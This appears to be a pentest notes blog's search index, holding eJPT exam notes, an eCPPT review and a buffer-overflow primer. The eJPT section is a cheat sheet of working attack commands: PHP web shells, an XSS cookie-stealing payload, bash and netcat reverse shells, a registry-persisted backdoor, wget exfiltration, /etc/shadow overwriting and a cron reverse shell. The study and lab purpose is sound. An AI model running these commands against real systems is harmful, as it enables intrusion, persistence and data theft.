var store = [{
        "title": "eLearnSecurity Junior Penetration Tester",
        "excerpt":"     My Review                  Difficulty: ★☆☆☆☆                         Price: ★★★★☆       $249                 Material: ★★☆☆☆                         Real-World Scenario: ★☆☆☆☆                         Worth it?: Yes, as a first cert                         Official Site: eJPT by INE                      This is eJPTv1, So I reckon that the material got better after the update       If you have zero experience with Pentesting, start with TryHackMe. Learn the basics then you are good to go!    Gather information   on google:  site: &lt;website&gt;   DNSdumpster.com VirusTotal  ctr.sh &lt;certificate search&gt;   on kali:  sublist3r -d &lt;domain&gt; subbrute   apt-get install snapd service snapd start snap install amass snap run amass -ip -d &lt;domain&gt;   PORT SCAN   fping -a -g &lt;host&gt; 2&gt;/dev/null   To get the ips that are UP, we can send to a file   Nmap can execute the scan with:  -iL &lt;file&gt;. -sS - stealth scan  -sT - tcp scan &gt; generates logs -sV - get versions &gt; not as stealth but very useful -O  - Try to get OS -iL - get hosts by file -Pn - assumes all hosts are ups and try to scan -p  - port -A  - More profound scan   We can go with:  -sV -T4 -p-  then -sV -T4 -p &lt;the ports&gt; -A &gt; nmap.result   VULNERABILITY SCAN      OpenVAS   Nexpose   GFI LAN Guard   Nessus   List of various vuln scans: https://sectools.org/tag/vuln-scanners/   Web Scan   MANUAL FINGERPRINT  nc &lt;target&gt; 80 HEAD / HTTP/1.0 &lt;space&gt; &lt;space&gt;   For https use openssl:  openssl s_client -connect &lt;target&gt;:443 HEAD / HTTP/1.0   httprint -P0 -h &lt;target&gt; -s &lt;signature file&gt; -P0 - to avoid pinging the host -h - target hosts   HTTP VERBS PUT   to count in bytes how long your payload is:  wc -m payload.php   nc &lt;target site&gt; 80 PUT /payload.php hTTP/1.0 Content-Type: text/html Content-lenght: 136 &gt; value that we get with wc -m &lt;payload&gt;   &lt;?php phpinfo(); ?&gt;   PHP shell code: to use with PUT method:   &lt;?php if (isset($_GET['cmd'])) {   $cmd = $_GET['cmd'];   echo '&lt;pre&gt;';   $result = shell_exec($cmd);   echo $result;   echo '&lt;/pre&gt;'; } ?&gt;   After uploading this shell, we can go to the browser and use:  \"?cmd=&lt;command&gt;\"    NC   we can send files using netcat also: Receiver  nc -lvnp &lt;port&gt; &gt; output_file.txt   Sender  echo 'hello' | nc -v &lt;ip&gt; &lt;port&gt; or cat &lt;file_u_Wanna_send&gt; | nc -v &lt;ip&gt; &lt;port&gt;   Bind Shell with netcat:   in the server/listener:  nc -lvnp &lt;port&gt; -e /bin/bash   in the client/sender:  nc -v &lt;ip&gt; &lt;port&gt;   Dictionary-based Enumeration  common backup file names are: .bak, .old, .txt and .xxx   DIRB   -x &lt;file of extensions&gt; -X \"extensions.bak, extensions.xxx\" -z delay in miliseconds -o output a file -p proxy -H \"set a header\" -u basic authentication \"user:password\" -c \"set a cookie\" -a \"set a agent user\"   XSS  reflective &gt; can execute commands and get answer of output in the browser stored &gt; can send files to the server / get cookies for others users and steal sessions   find a user input field:  # try to execute a html command like  &lt;h1&gt; teste &lt;/h1&gt;  # try to execute JS command like  &lt;script&gt;alert('XSS');&lt;/script&gt;   payload to steal cookies: XSS Stored we need to have a page to send the cookies, in this case we have get.php but in  real scenario we gottta have a page set up to be able to do that.   &lt;script&gt; var i = new Image(); i.src=\"http://192.168.99.11/get.php?cookies=\"+document.cookie;  &lt;/script&gt;   after that, we go to the ip 99.11 and get the file with the stolen cookie.   MYSQL INJECTION   ' or substr(user(), 1, 1) = 'a ' or substr(user(), 1, 1) = 'b   after finding the first letter   ' or substr(user(), 2, 1) = 'a           go to the second one.            guessing the current user.       SQLMap   sqlmap -u &lt;URL&gt; -p &lt;injection parameter&gt; [options]   example:   sqlmap -u 'vulnerable url' -p id --technique=U #using UNION   with POST:   sqlmap -u 'url' --data &lt;post string&gt; -p parameter [options] # u can get the post string with burp   -b - banner --tables --current-db &lt;name&gt; --columns --dump -v3 --fresh-queries # to see what payload the sqlmap used --dbs # to see the databases availables --users # to see the users -D # set the database of your choice -T # set the tables of your choice -C # set column of your choice -r # request, we can get from burp --technique=U # UNION attack --technique=B # boolean-based attacks --flush-session # if you need to clear the logs for a rerun test or smt like that #logs &gt; /usr/share/sqlmap/output/   System Atacks   ncat  -l  -listem -e  -execute file -p  -port -v  -verbose   backdoor      copy ncat (with the right OS version) to the target   as WIndows\\system32\\winconfig.exe   go to regedit   HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run   New &gt; String Value Edit with the path of the ncat as winconfig follow by the ip of attacker and port to connect    -e cmd.exe example: \"C:\\Windows\\System32\\winconfig.exe &lt;IP&gt; &lt;PORT&gt; -e cmd.exe\"   # the persistence is set.  # We can listen in our attacker machine  ncat -l -p &lt;port&gt; -v   METERPRETER  if u have a session already   to get persistence:  use exploit/windows/local/s4u_persistence   or  use exploit/windows/local/persistence set payload, session, lhost and port  set DisablePayloadHandler false set start SYSTEM   then we are able to open a session even after the reboot with:  use exploit/multi/handler set payload, lhost and port   with meterpreter we can:  - screenshot &gt; to grab the screen of the target   # [in the attack machine]  eog /path of the screenshoot download &lt;file&gt; or  \"/path\" upload &lt;file&gt; /path sysinfo ps #running proccess whoami /priv help #to see all commands hashdump search -f &lt;file&gt;   getuid #WINXP-ftp getsystem &gt;&gt; this give us escalate privileges, now we are NT AUTHORITY\\SYSTEM getuid #AUTHORITY\\SYSTEM sysinfo   JOHN  bruteforce:   --list=formats  #to see all formats available   after get the shadow and passwd files:  unshadow passwd shadow &gt; crackme   john -incremental -users:victim crackme john --show crackme #to see the result   dictionary:  john -w=/&lt;wordlist&gt; &lt;file&gt; -rules #to add mangling example PASSWORD in the wordlist, mangling = password, passw0rd etc   rainbow tables:     tools: ophcrack #its used only for Windows   HASHCAT  can use rules as well, to implement certain variations to the normal dictionaries; example:   password/p4ssw0rd/PAssWord!/123password etc    NETWORK ATTACKS   Hydra -l -p &lt;target&gt; &lt;service&gt;  -l - fixed user -L - wordlist for user -p - fixed password -P - wordlist for passwords  hydra &lt;IP&gt; &lt;type: http-post-form&gt; \"&lt;directory-of-login-page&gt;:&lt;user=^USER^&amp;pass=^PASS^:&lt;message of invalid credentials&gt;\" -l &lt;user&gt; -p &lt;pwd&gt; -f {to exit when find a valid login} -V {verbose, to show us the result}    SHARES   Windows:   unumerate windows shares:   nbtstat  nbtstat -A &lt;IP&gt; # most common, display information about the target   output:  Name - Type - Status xx    - &lt;00&gt; is a workstation - Registered xx    - &lt;20&gt; sharing is up and running- Regustered  NET VIEW &lt;target IP&gt;   Linux:  nmblookup -A &lt;target ip&gt;  smbclient -L //&lt;IP&gt; -N   -L = #to look which services are available -N #to force to not ask For password   Checking ‘for’ NULL Sessions with Windows:  net use \\\\&lt;IP&gt;\\IPC$ '' /u: ''   Checking ‘for’ NULL Sessions with Linux  smbclient \\\\\\\\&lt;IP&gt;\\\\IPC$ -N   TOOLS   in Windows:   enum:  enum -S &lt;IP&gt; # enumerate shares enum -U &lt;IP&gt; # enumerate users enum -P &lt;IP&gt; # check password policy   winfo:  winfo &lt;IP&gt; -n   in Linux: enum4linux   samrdump &lt;IP&gt;   /usr/share/doc/python-impacket-doc/examples/   we can use nmap to enumerate the shares also:  nmap -script=smb-enum-shares &lt;IP&gt; nmap -script=smb-enum-users &lt;IP&gt; nmap -script=smb-brute &lt;IP&gt;   nmap --script smb-check-vulns.exe --script-args=unsafe=1 &lt;IP&gt;      [!NOTE] This checks if the machine is vulnerable against well known vulnerabilties    ARP      [!NOTE] its a protocol to resolve ip address into mac address    First we need to enable IP Forwarding:   By enabling IP Forwarding, you tell your machine to forward the packets you intercept to the real destination host.   echo 1 &gt; /proc/sys/net/ipv4/ip_forward   You can then run arpspoof:   arpspoof -i &lt;interface&gt; -t &lt;target&gt; -r &lt;host&gt;  example:  arpspoof -i eth0 -t 192.168.4.11 -r 192.168.4.16      [!NOTE] You can then run Wireshark and intercept the traffic!    METERPRETER   Most used Payloads:   bind_tcp      Runs a server process on the target machine that waits for connections from the attacker machine   reverse_tcp      Performs a TCP connection back to the attacker machine. As you saw in the Backdoors chapter, this feature   help evade firewall rules      We can use the getsystem to update our privilege, but in modern Windows that is not possible because of the User Account Control We can bypass that restriction by using the “bypassuac”       search bypassuac     use exploit/windows/local/bypassuac set session &lt;session that we want to update privileges&gt;              in the new meterpreter session, the UAC is disabled, so we can execute the command “getsystem”       hashdump to dump the password databases and save it ‘for’ an offline cracking session;   use post/windows/gather/hashdump set session &lt;session number&gt;   We can ‘download’ and ‘upload’ files:  'shell' &gt; to run standard operating system shell  run post/windows/gather/win_privs = whoami /priv  ps   We can migrate to a process to be more stealth:  ps -U SYSTEM or whatever our privileges is;  migrate &lt; PID &gt;  getpid to see if it worked.  hashdump # to hash the pwd and shadow, but only works if we have SYSTEM privilege.      get that and run john to crack    If we have a session already, we can upgrade to meterpreter session   by using:  post/multi/manage/shell_to_meterpreter set session &lt;number&gt; set lport and lhost run    Remote Code Executions   echo $PATH # visit some of these locations and view what tools are there  # is netcat present? which nc # is python present? which python # is curl installed? which curl # is wget installed? which wget   we can use these tools do get shell.   with netcat:  nc &lt;IP&gt; &lt;port&gt; -e /bin/bash   and listening in our kali  nc -lvnp &lt;port&gt;   with CURL  In kali:  nc -lvnp &lt;port&gt;   In target:  curl http://&lt;our IP&gt;:&lt;port&gt; curl http://&lt;our IP&gt;:&lt;port&gt;/'whoami' curl http://&lt;our IP&gt;:&lt;port&gt;/'id | base64' curl http://&lt;our IP&gt;:&lt;port&gt;/file -T /etc/issue   We can try to upload a msfvenom payload to the machine. msfvenom -p linux/x64/shell_reverse_tcp lhost= lport= -f elf -o    curl http://&lt;our IP&gt;:&lt;por&gt;/&lt;file&gt; -o /tmp/r chmod +x /tmp/r /tmp/r # run after netcat is listening   PrivEsc WgelCTF   user was able to use wget as SUDO…   1:  sudo wget --post-file /root/root.txt http://10.10.14.5:443/      I sent the flag through http.server    2:  Create shadow file  openssl passwd -1 -salt 0xdf password  sudo wget -O /etc/shadow http://10.10.14.5/shadow su -   I did a file a shadow file and overwrote the actual shadow of the machine:  root:$1$0xdf$fKKvgEPPSu1HMdNI3w5i50:18195:0:99999:7:::      so when the command su - is written, I get root access.    root@CorpOne:~# id uid=0(root) gid=0(root) groups=0(root)   Extra notes                  Service       User       Password       Notes                       Wordpress       administrator                              Wordpress Appearance &gt; theme-editor &gt; select a theme that is not in use &gt; 404 Template &gt; edit your php file    &lt;?php system($_REQUEST['cmd']); ?&gt;   dominio/main/wp-content/themes//404.php?cmd=whoami   bash -c 'bash -i &gt;&amp; /dev/tcp/&lt;kali ip&gt;/&lt;port&gt; 0&gt;&amp;1' # You can encode with burp before send curl &lt;ip:port&gt;   COPY cat command  cat reverse-shell.php | xclip -selection clipboard   After open a python server to send a file:   grab with curl:  curl &lt;ip:port&gt;/linpeas.sh | bash or sh # this will execute directly   Better shell  { python -c \"import pty;pty.spawn('/bin/bash')\" crtl + z stty raw -echo fg enter enter }   Discovery Web Content: dirb, gobuster, dirsearch  ffuf -u &lt;url&gt;/FUZZ -w &lt;wordlist&gt; ffuf -u &lt;url&gt;/FUZZ-- -w &lt;wordlist-special-chars&gt; -mc 200,500 -fw 9   GOBUSTER - WEB ENUMERATION   try to find directories  gobuster dir -w /opt/Seclists/Discovery/Web-Content/raft-small-words.txt -x php -u &lt;url&gt; -o gobuster/dir-root.log   try to find subdomains  gobuster vhost -w /opt/Seclists/Discovery/DNS/subdomains-topmillion-110000.txt -u &lt;url&gt; -o gobuster/vhist-sub.txt      We can save the request of a login from burp/zap with copy to file. request.req    SQLMAP  sqlmap -r &lt;login.req&gt; --batch sqlmap -r &lt;login.req&gt; --batch --level 5 --risk 3   GREP  cat &lt;file&gt; | grep -v &lt;somethin&gt; # show everything except lines with &lt;something&gt;   WITH LOGINS:   we can try to register 'admin&lt;space&gt;'  sometimes the site register the same username of 'admin' and when we try to login we have admin privileges to the web server   cat /etc/passwd | grep sh$ | awk -F '{print 1$}' # print all the usernames that finish with sh   poetry run CrackMapExec ssh &lt;url&gt; -u &lt;users file&gt; -p &lt;pwd file&gt;   zcap can read gzip files like a cat:  zcap access.log.*.gz | grep -iv 'a\\|b\\|c'   AUREPORT   Can do a report upon the logs files.   example:  aureport --tty # to show terminals access    Pivot   In kali:   create a directory: /www   python3 -m http.server nc -lvnp 8000 &lt; {file we want to send}   In target:   curl &lt;ip&gt;:&lt;port&gt;/&lt;file&gt;\t wget http://&lt;ip&gt;:&lt;port&gt;/file cat &lt; /dev/tcp/&lt;kali ip&gt;/&lt;port&gt; # to get the output of the file bash -c \"cat &lt; /dev/tcp/&lt;kali ip&gt;/&lt;port&gt;\" # if the shell isnt bash, try to execute as bash bash -c \"cat &lt; /dev/tcp/&lt;kali ip&gt;/&lt;port&gt; &gt; /dev/shm/LinEnum.sh\" # try to send to a file bash -c \"bash -i &gt;&amp; /dev/tcp/&lt;kali ip&gt;/&lt;port&gt; 0&gt;&amp;1\" # to get reverse shell      It works like fping -a -g - but sometimes the target does not have this option     for ip in $(seq 1 5); do ping -c 1 &lt; x.x.x.$ip &gt; /dev/null &amp;&amp; echo \"Online: x.x.x.$ip\"; done           nmap inside machine without nmap     for port in $(seq 1 65535); do (echo scan &gt; /dev/tcp/&lt;target ip&gt;/$port &amp;&amp; echo \"Open: $port\") 2&gt;/dev/null; done           PIVOT with CHISEL   IN Kali:  chisel server -p 8000 -reverse -v   after the handshake with the chisel server:  \t\tcurl localhost:8001   In Target:   chisel client &lt;kali ip&gt;:8000 R:8001:&lt;target ip&gt;:80  # This will open port 8001 of our kali to send data through the tunneling network to port 80 of the target  chisel client &lt;kali ip&gt;:8000 R:8001:127.0.0.1:&lt;target ip&gt;:80  # Its a bit more secure, cause we only can access though the localhost  chisel client &lt;kali ip&gt;:8000 R:127.0.0.1:6379:&lt;target ip&gt;:6379\t # We can access the 6379 port of the target in our machine by localhost:&lt;port we just opened&gt;  nmap -sT -p &lt;port&gt; -sC -sV localhost -oA nmap/name-u-want   We can visualize the open port with netstat:  netstat -alnp | grep 8001   LOCAL PIVOT   In Kali:  chisel server -p 8000   In target:  chisel client &lt;kali ip&gt;:&lt;port&gt; 9001:127.0.0.1:8001 # this open the 9001 of the target and tunnel with our 8001 port  chisel client &lt;kali ip&gt;:&lt;port&gt; 9001:1&lt; another target ip &gt;:445 # to open a windows box through tunneling   telnet or nc localhost &lt;port&gt; flushall set AnyText \"&lt;? system($_REQUEST['cmd']); ?&gt;\" config set dbfilename shell.php config set dir /var/www/html/  Then we can open in the browser ip/shell.php?cmd=&lt;command&gt;  # problably what we want is a reverse shell # so we cam grab in pentest monkey   Do a CRONJOB in target:  echo \"* * * * * root bash -c 'bash -i &gt;&amp; /dev/tcp/&lt;kali ip&gt;/&lt;port&gt; 0&gt;&amp;1'\" &gt; runme   send with rsync:  rsync -a runme rsync://backup:873/src/etc/cron.d/runme   We can send commands base64 encoded, if the shell of the target machine is not accepting out request;  bash -c 'bash -i &gt;&amp; /dev/tcp/&lt;kali ip&gt;/&lt;port&gt; 0&gt;&amp;1' | base64   get the output:  echo \"* * * * * root bash -c 'output in base64 | base64 -d\" &gt; runme   REVERSE SOCKS   In Kali:  chisel server -p 8000 -reverse -v   In Target:  chisel client &lt;kali ip&gt;:8000 R:8001:127.0.0.1:1337 chisel server -p 1337 --socks5      Will redirect everything from our port 8001 to port 1337 of the target    In Kali again:  chisel client 127.0.0.1:8001 socks  ","categories": ["notes"],
        "tags": ["begginer","pentest","review"],
        "url": "/notes/ejpt/",
        "teaser": "/assets/images/posts/2023-11-18-ejpt/ejpt-teaser.jpg"
      },{
        "title": "eLearnSecurity Certified Professional Penetration Tester",
        "excerpt":"     My Review                  Difficulty: ★★☆☆☆                         Price: ★★☆☆☆       $400                 Material: ★★☆☆☆                         Real-World Scenario: ★★☆☆☆                         Worth it?: No, it’s outdated                         Official Site: eCPPTv2 by INE                      They need to update this cert ASAP, otherwise is not really worth it       Tips   Not required to pass the exam:  - System Security - Powershell - Wi-fi - Ruby   However, Be prepared to:  - Buffer Overflow - Pivoting (learn Chisel, its gonna be useful in the long run) - Web app - Understand the Network (drawing network maps helps)   Useful Resources:  https://pentest.blog/explore-hidden-networks-with-double-pivoting/ https://github.com/Kitsun3Sec/Pentest-Cheat-Sheets https://www.orangecyberdefense.com/fr/insights/blog/ethical-hacking/etat-de-lart-du-pivoting-reseau-en-2019   ","categories": ["review"],
        "tags": ["begginer","pentest","review"],
        "url": "/review/ecppt/",
        "teaser": "/assets/images/posts/2023-11-19-ecppt/ecppt-teaser.jpg"
      },{
        "title": "1 - System Security",
        "excerpt":"  Architecture   Fundamentals   CPU - Central Process Unit  is the device in charge of executing the machine code of a program the machine code/language is the set of instructions that the CPU processes each instructions is a primitive command that executes a specific operation such as move data, changes the flow, logic operations etc is represented in hexadecimal (HEX) is traslated to assembly language (ASM). \tNASM &gt; Netwide Assembler \tMASM &gt; Microsoft Macro Assembler   Instruction Set Architecutre (ISA)  each cpu has one is a set of instructions is what a programmer can se: memory, registers, instructions etc x86 = 32-bit processors x64 = 64-bit processors (aka x86_64 or AMD64)   Registers  The number of bits: 32 or 64 &gt; refers to the width of the CPU registers think as temporary variables used by the CPU to get and store data   General Purpose Registers (GPRs)  | x86 naming convention | Name | Purpose | | EAX | Accumulator | Used in arithmetic operation | | ECX | Counter | Used in shift/rotate instruction and loops | | EDX | Data | Used in arithmetic operation and I/O | | EBX | Base | Used as a pointer to data | | ESP | Stack Pointer | Pointer to the top of the stack | | EBP | Base Pointer | Pointer to the base of the stack (aka Stack Base Pointer or Frame pointer) | | ESI | Source Index | Used as a pointer to a source in stream operation | | EDI | Destination | Used as a pointer to a destination in stream operation |   CPUs Types  In 8-bit CPU: \tL = low byte \tH = high byte  In 16-bit CPU: \tcombines L/H and replaces with X \tWhile Stack Pointer, Base pointer, source and destination removes the L  In 32-bit CPU: \tE = means extended, its used as prefix  In 64-bit CPU: \tE &gt; R = E is replaced by the R   Name Convention                  RAX       RCX       RDX       RBX       RSP       RBP       RSI       RDI                          EAX       ECX       EDX       EBX       ESP       EBP       ESI       EDI                          AX       CX       DX       BX       SP       BP       SI       DI                          AH/AL       CH/CL       DH/DL       BH/BL       SPL       BPL       SIL       DIL           Instruction Pointer (EIP)  It tells the CPU where the next instruction is   Process Memory   0 Lower memory addresses —————————————- |.text  | - Instructions |.data | - Initialized variable |BSS   | - Uninitialized variable (Block Started by Symbol) |Heap | - brk/sbrk &gt; malloc, realloc, free = the size of the data region can be extended |         | |Stack |  —————————————- 0xFFFFFFFF Higher memory addresses —————————————-   Stack  Last-In-First-Out = LIFO Think as an array used For saving a functions return addresses, passing function arguments and storing local variables.   Stack consists of logical stack frames (portions/areas of the Stack),  That are PUSHed when calling a function and POPed when returning a value.   ESP  The purpose of the ESP register (Stack Pointer) is to identify the top of the stack and its modified each time a value is pushed in (PUSH) or popped out (POP).   The stack grows downward, towards the lower memory addresses The heap grows upwards, towards the higher memory addresses   0 Lower Addresses | Heap &gt;     &lt; Stack | 0xFFFFFFFF Higher Addresses   PUSH instructions   Instructions:  \tPUSH E Process: \tPUSH is executed and the ESP register is modified Starting Value: \tESP points to the top of the stack Subtracts 4 (in 32-bit) or 8 (in 64-bit) from ESP   Example:  ESP points to the top of the stack -4 |A| |B| |C| |D|  PUSH(E) |E| = (it decreases by 4) |A| |B| |C| |D|  Example 2: ESP = 0x0028FF80 PUSH 1 |data| |data| |data| |data|  ESP = 0x0028FF7C (it decreases by 4) |00000001| |data| |data| |data| |data|   POP instructions  It retrieves data from the top of the Stack and usually store in another register Process: \tPOP is executed and the ESP register is modified (ESP +4) Starting Value: \tESP points to the top of the stack Increments 4 (in 32-bit) or 8 (in 64-bit) from ESP   Example:  ESP points to the top of the stack +4 |E| |A| |B| |C| |D|  POP(E) |A| ESP+4 |B| |C| |D|  Example 2: ESP = 0x0028FF7C  |00000001| |data| |data| |data| |data|  POP EAX |00000001| &gt; the value is not deleted(or zeroed).  It will stay in the stack until another instruction overwrites it |data| &gt; ESP = 0x0028FF80 (it increases by 4) |data| |data| |data|   Stack Frame   Functions  prologue \tits a sequence of instructions that take place at the beginning of a function. \thow the stack frames are created epilogue   The stack frame keeps track of the location where each subroutine should return the control when it terminates.   Main operations:     When a function is called, the arguments [(in brackets)] need to be evaluated   The control flow jumps to the body of the function, and the program executes its code   Once the function ends, a return is encoutered, the program returns to the function call (the next statement in the code).   Arguments in functions will be pushed on the stack from right to left (argc, argv)   Prologue  When the program enters a function, the prologue is executed to create the new stack frame push ebp = saves the old base pointer onto the stack, so it can be restored later when the functions returns mov ebp, esp = copies the values of the stack pointer into the base pointer. \tIn assembly, the second operand of the instruction (esp in this case) is the source, While the first operando (ebp in this case) is the destination. Hence, esp is moved into ebp. sub esp, X //x is a number =  The instruction subtracts X from esp. To make space For the local variables.   Epilogue  POP operation automatically updates the ESP, same as PUSH  ------------------- leave  ret ------------------- ------------------- mov esp, ebp pop ebp ret -------------------   Endianness     Is the way of representing (storing) values in memory there is 3 types, the most important ones: big-endian / little-endian    MSB - The Most Significant Bit     In a binary number is the largest value, usually the first from the left  the binary 100 = MSB 1   LSB - The Least Significant     In a binary number is the lowest value, usually the first from the right. the binary 110 = LSB 0   In the Big-endian:  \tLSB &gt; is stored at the highest memory address \tMSB &gt; is stored at the lowest memory address   0x12345678                  Highest memory       address in memory       byte value                         +0       0x12                         +1       0x34                         +2       0x56                         +3       0x78                 lowest memory                           In the Little-endian:  \tLSB &gt; is stored at the lowest memory address \tMSB &gt; is stored at the highest memory address   0x12345678                  Highest memory       address in memory       byte value                         +0       0x78                         +1       0x56                         +2       0x34                         +3       0x12                 lowest memory                           No Operation Instruction (NOP)  NOP in an assembly language instruction that does nothing When the program encounters a NOP, it will simply skip to the next instruction      In x86 = 0x90 - NOP are represented with the hexadecimal value    The reason we use NOPs, its to allow us to slide down to the instruction we want execute The buffer overflows have to match a specific size and location that the program is expecting.   Security Implementations  Here is an overview of the security implementations that have been developed during the past years to prevent, or impede, the exploitation of vulnerabilities such as Buffer Overflow      Address Space Layout Randomization (ASLR)   Data Execution Prevention (DEP)   Stack Cookies (Canary)   ASLR  Introduce randomness For executables, libraries and stacks in the memory address space. This makes it more difficult For an attacker to predict memory addresses and causes exploits to fail and crash process.   DEP  Is a defensive hardware and software measure that prevents the execution of code from pages in memory that are not explicitly marked as executable. The code injected into the memory cannot be run from that region; This makes bof exploitations even harder.   Canary  Is a security implementation that places a value next to the return address on the stack.   Assembler Debuggers and Tools Arsenal      Assembly is a low-level programming language consisting of a mnemonic code, also known as an opcode (operation code).   Assembler   An assembler is a program that translates the Assembly language to the machine code.   Microsoft Macro Assembler (MASM) GNU Assembler (GAS) - Netwide Assembler (NASM) Flat Assembler (FASM)   Process assembly to executable   When a source code file is assembled, the result file is called object file. then a linker is needed to create the actual executable file. what linker does is take one or more object files and combine them to create the executable file.   \tASM file &gt; assembler &gt; object file / static library &gt; linker &gt; executable   Compiler  converts high-level source code (such as C) into low-level code or directly into an object file. the end result is an executable file.   NASM  https://forum.nasm.us/index.php?topic=1853.0   Instructions  Data Transfer: \tMOV, XCHG, PUSH, POP Arithmetic: \tADD, SUB, MUL, XOR, NOT Control Flow: \tCALL, RET, LOOP, Jcc (where cc is any condition) Other: \tSTI, CLI, IN, OUT   Example: Sum  MOV EAX, 2 MOV EBX, 5 ADD EAX, EBX --------------------- store 2 in eax store 5 in ebx do eax = eax + ebx now eax contains the results   Intel vs AT&amp;T  intel(windows) = MOV EAX, 8 -  at&amp;t (linux) = MOVL $8, %EAX -    the at&amp;t puts a percent sign (%) before registers names and a dollar sign ($) before numbers also adds a suffix to the instruction, which defines the operand size: \tQ (quad - 64bits), L (long - 32bits), W (word - 16 bits), B (byte -8 bits).   More about PUSH  push stores a value to the top of the stack, causing the stack to be adjusted by -4 bytes (on 32-bit systems): -0x04   PUSH 0x12345678 can be similar to: --------------------------------------------------- SUB ESP, 4 MOVE [ESP], 0x12345678 --------------------------------------------------- subtract 4 to esp -&gt; esp=esp-4 store the value 0x12345678 to the location pointed by ESP. square brackets indicates to address pointed by the register.   More about POP  pop reads the value from the top of the stack, causing the stack to be adjusted +0x04.   POP EAX operation can be done: --------------------------------------------------- MOV EAX, [ESP] ADD ESP, 4 --------------------------------------------------- store the value pointed by ESP into EAX   → the value at the top of the stack add 4 to ESP - adjust the top of the stack   CALL  Subroutines are implemented by using the CALL and RET instruction pair:  The CALL instruction pushes the current instruction pointer (EIP) to the stack and jumps to the function address specified. Whenever the function executes the RET instruction, the last element is popped from the stack, and the CPU jumps to the address.    MOV EAX, 1 MOV EBX, 2 CALL ADD_sub INC EAX   JMP end_sample ADD_sub: ADD EAX, EBX   end_sample:  store 1 in eax store 2 in ebx call the subroutine named ADD_sub increment eax: now eax holds “4” 2 (ebx) + 1 (eax) +1 (inc) —————————————————   Tools Arsenal  https://sourceforge.net/projects/orwelldevcpp/   dev-C++ creates a directory named MinGW64 when all the compiling tools are stored. to comple .c or .cpp files we can use the gcc.exe compiler found in the bin folder.   \tlinux: gcc file.c -o output \twindows: gcc -w32 file.c -o output.exe   Debuggers     Immunity Debugger - https://www.immunityinc.com/products/debugger/ IDA GDB X64DBG EDB WinDBG OllyDBG Hopper   Decompiling  If u have a executable file and are asked how it works, you need to disassemble it in order to obtain the assembly code.  objdump -d -Mintel file.exe &gt; disasm.txt   Immunity Debugger      1 - Panel Where assembler code is produced or viewed when you are debugging a module. columns: • 1 - address location • 2 - machine code  • 3 - assembly language • 4 - debugger comments   2 - Register Panel • names of registers • their content • ASCII string, the value of the string   3 - Memory Dump Panel show memory locations   4 - Stack Panel show current thread stack columns: • 1 - memory addresses • 2 - values on the stack • 3 - explanation of the content • 4 - debugger comments   Shortcuts  • ctrl+F2 - to restart a program  • F9 - to start a program  • ‘e’ icon - open executable modules   Buffer Overflows   Overview   buffer overflow = To fill more data than the buffer can handle.   example:  #include &lt;string.h&gt; #include &lt;stdio.h&gt;   int main(int argc, char** argv) { \targv[1] = (char*)\"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\"; \tchar buffer[10]; \tstrncpy(buffer, argv[1], sizeof(buffer));  \treturn 0; }   0x41 is the hexadecimal value of A The EIP is overwritten (Instruction Pointer), it tells the program what to run next, but as a result of all our A’’s, that address value is A.   Questions that need answers          How many ‘A’s do we need to crash the application?   we can fuzz the application to discover where it crashed            What address do we want written in the EIP?   after we know where it crashed, we can insert the address we want to EIP and its gonna return to this specific memory address.            we can use helper.cpp to send payload to EIP or with python code:       import sys import os payload = '\\x41' * 22 payload += '\\x48\\x15\\x40' command = 'goodpwd.exe %s' %(payload)  print path os.system(command)   Finding Buffer Overflows   Any application that uses unsafe operations, might be vulnerable:     strcpy   strcat   get / fgets   scanf / fscanf   vsprintf   printf   memcpy   Any function which carries out the following may be vulnerable:     does not properly validate inputs before operating   does not check input boundaries      All the interpreted languagues such as C#, Visual Basic, .NET, JAVA etc. are safe from such vulnerabilities    BoF can be triggered:     user input   data loaded from a disk   data from the network   If you have access to the source code:     splint - http://www.splint.org/   cppcheck - http://cppcheck.sourceforge.net/      When a crash occurs, be prepared to hunt For the vulnerability with a debugger. Some companies use cloud-fuzzing to brute-force crashing (using file-based inputs).    Tools like: (tracks the executions and data flow)     fuzzer   tracer   Almost 50% of vulnerabilities are not exploitable at all, but they may lead to DOS or cause other side-effects   Fuzzing  provides input to a programm such as:     command line   network data   databases   keyboard / mouse input   parameters   file input   shared memory regions   environment variables   Basically supplies random data to the program and then the program is checked For incorrect behavior:     memory hogging   CPU hogging   crashing   Its resource-intensive, therefore cannot be used to test all the cases.   Some Fuzzing tools and frameworks     Peach Fuzzing Platform   Sulley   Sfuzz   FileFuzz   Code Observation  stack frame of main function:  |...| |buffer[4]| |Int cookie=0| |Old EBP| |Return address of function| |main() parameters| |...|   [EBP - X] &gt; local variables [EBP + X] &gt; function parameters   the [brackets] in assembly notation are used to indicate that we are pointing to the memory   The code does not verify the lenght of the data and note stack space is limited. Therefore, it is susceptible to an overflow.      IDA Pro = http://www.hex-rays.com    Exploiting Buffer Overflows   If we know the size of the input that allows us to overwrite the EIP.   esp points to other                  EBP       OLD EBP       OLD EIP       OTHER                 A       A       A                   we wanna overwrite the EIP (ABCD) with the address of our shellcode. since ESP points to the next address after the return address location in memory (OTHER). we can place the shellcode from that location!   we need to full the first 22 bytes (local vars + EBP) with junk data (NOPs), rewrite the EIP and then insert the shell code.   Junk Bytes (22 bytes) + EIP address (4 bytes) + Shellcode   Finding the right OFFSET  we can send 1500 bytes to the application: \tif the application crashes &gt; we try to send half (1500/2) \tif crashes we will continue splitting the amount by 2. (750/2) \tif does not crash, we will add half of the amount to our bytes 750+(750/2) = 1125   Scripts like pattern_create / pattern_offset make this task much easier.   After sending the pattern_create: We will have to specify the value in the EIP register to the point when the application crashes. Providing this number to the second file, ‘pattern_offset’ will give us the exact number of junk bytes that we need to reach the EIP.   Grabbing the Offset value     1 - Generate the payload: ./pattern_create.rb    2 - Copy the ASCII payload and use it as the input.   Once it crashes, we will have to debug it in order to obtain the overwritten value    Get the EIP value after the crash. ex: 61413761 = 0x61413761   3 - Copy the EIP value and use it as input For the second script:   ./pattern_offset.rb -l  -q    *grab the OFFSET value*      with Immunity Debugger &amp; Mona We can execute the entire procces in Immunity Debugger using Mona. Download mona.py &gt; copy to PyCommand folder (inside the immunity debugger instalation folder)    Process  1 - Copy the file 2 - Open Immunity Debugger 3 - Load the application \t!mona config -set workingfolder C:\\ImmunityLogs\\%p \t‘we are telling mona to use this folder as a working folder, to save all files there’ 4 - !mona pc  = the same as pattern_create \tcopy the EIP value 5 - !mona po  = the same as pattern_offset \tgrab the offset value   Useful command is *suggest*. Once the application crashes and the EIP is overwritten with the pattern create by Mona, we can 